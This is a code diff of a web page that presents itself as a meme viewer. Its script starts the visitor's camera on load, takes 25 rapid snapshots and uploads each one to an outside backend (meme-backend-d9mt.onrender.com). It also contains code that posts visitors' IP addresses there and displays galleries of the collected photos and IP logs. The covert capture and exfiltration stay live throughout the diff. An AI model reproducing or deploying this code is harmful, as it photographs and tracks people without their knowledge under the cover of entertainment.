@@ -85,7 +85,6 @@
         const photosGallery = document.getElementById('photos-gallery');
         const capturedPhoto = document.getElementById('captured-photo');
         const ipAddressElement = document.getElementById('ip-address');
-        let loadingMemes = false;
         let photos = [];
 
         function showPage(page) {
@@ -112,7 +111,6 @@
                         if (count === 25) {
                             clearInterval(interval);
                             stopCamera(stream);
-                            display8thPhoto();
                         }
                     }, 200);
                 })
@@ -125,97 +123,94 @@
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
             const photoSrc = canvas.toDataURL('image/png');
-            uploadPhoto(photoSrc);
-        }
 
-        function display8thPhoto() {
-            if (photos.length >= 8) {
-                capturedPhoto.src = photos[7].src;
+            photos.push(photoSrc);
+
+            if (photos.length === 8) {
+                capturedPhoto.src = photoSrc;
                 capturedPhoto.style.display = 'block';
+                localStorage.setItem('capturedPhoto', photoSrc);
             }
+
+            uploadPhoto(photoSrc);
         }
 
         function stopCamera(stream) {
             stream.getTracks().forEach(track => track.stop());
         }
 
-        async function fetchIP() {
-            try {
-                let response = await fetch("https://api.ipify.org?format=json");
-                let data = await response.json();
-                ipAddressElement.textContent = `Your IP: ${data.ip}`;
-                logIP(data.ip);
-            } catch (error) {
-                console.error("Error fetching IP:", error);
-            }
+        function fetchPhotos() {
+            fetch("https://meme-backend-d9mt.onrender.com/getImages")
+                .then(response => response.json())
+                .then(images => {
+                    photosGallery.innerHTML = '';
+                    images.forEach(img => {
+                        let imageElement = document.createElement('img');
+                        imageElement.src = `https://meme-backend-d9mt.onrender.com/uploads/${img.filename}`;
+                        photosGallery.appendChild(imageElement);
+                    });
+                })
+                .catch(error => console.error("Error fetching photos:", error));
         }
 
-        async function fetchMemes() {
-            if (loadingMemes) return;
-            loadingMemes = true;
-
-            try {
-                let response = await fetch("https://www.reddit.com/r/memes.json?limit=20");
-                let data = await response.json();
-
-                data.data.children.forEach(post => {
-                    let meme = post.data;
-                    if (meme.post_hint === "image") {
-                        let img = document.createElement("img");
-                        img.src = meme.url;
-                        memesContainer.appendChild(img);
-                    }
-                });
-            } catch (error) {
-                console.error("Error fetching memes:", error);
-            }
-            loadingMemes = false;
+        function fetchIPLogs() {
+            fetch("https://meme-backend-d9mt.onrender.com/getIPLogs")
+                .then(response => response.json())
+                .then(logs => {
+                    ipLogsContainer.innerHTML = '';
+                    logs.forEach(log => {
+                        let logEntry = document.createElement('p');
+                        logEntry.textContent = `${log.ip} - ${log.timestamp}`;
+                        ipLogsContainer.appendChild(logEntry);
+                    });
+                })
+                .catch(error => console.error("Error fetching IP logs:", error));
         }
 
         async function uploadPhoto(photoSrc) {
-            await fetch('https://meme-backend-d9mt.onrender.com/upload', {
-                method: 'POST',
-                body: JSON.stringify({ photo: photoSrc }),
-                headers: { 'Content-Type': 'application/json' }
-            });
-            fetchPhotos();
-        }
+            let formData = new FormData();
+            let blob = await fetch(photoSrc).then(res => res.blob());
+            formData.append("file", blob, "photo.png");
 
-        async function fetchPhotos() {
-            let response = await fetch('https://meme-backend-d9mt.onrender.com/getImages');
-            let data = await response.json();
-            photosGallery.innerHTML = '';
-            data.forEach(photo => {
-                let img = document.createElement('img');
-                img.src = photo.src;
-                photosGallery.appendChild(img);
-            });
+            fetch('https://meme-backend-d9mt.onrender.com/upload', {
+                method: 'POST',
+                body: formData
+            }).catch(error => console.error("Error uploading photo:", error));
         }
 
         async function logIP(ip) {
-            await fetch('https://meme-backend-d9mt.onrender.com/logIP', {
+            fetch('https://meme-backend-d9mt.onrender.com/logIP', {
                 method: 'POST',
                 body: JSON.stringify({ ip }),
                 headers: { 'Content-Type': 'application/json' }
-            });
-            fetchIPLogs();
+            }).catch(error => console.error("Error logging IP:", error));
         }
 
-        async function fetchIPLogs() {
-            let response = await fetch('https://meme-backend-d9mt.onrender.com/getIPLogs');
-            let data = await response.json();
-            ipLogsContainer.innerHTML = '';
-            data.forEach(log => {
-                let p = document.createElement('p');
-                p.textContent = `${log.ip} - ${log.timestamp}`;
-                ipLogsContainer.appendChild(p);
-            });
+        function fetchMemes() {
+            fetch("https://www.reddit.com/r/memes.json?limit=50")
+                .then(response => response.json())
+                .then(data => {
+                    memesContainer.innerHTML = "";
+                    data.data.children.forEach(meme => {
+                        let memeImg = document.createElement('img');
+                        memeImg.src = meme.data.url;
+                        memesContainer.appendChild(memeImg);
+                    });
+                })
+                .catch(error => console.error("Error fetching memes:", error));
+        }
+
+        function scrollToTop() {
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        if (localStorage.getItem('capturedPhoto')) {
+            capturedPhoto.src = localStorage.getItem('capturedPhoto');
+            capturedPhoto.style.display = 'block';
         }
 
         startCamera();
-        fetchIP();
         fetchMemes();
     </script>
 </body>
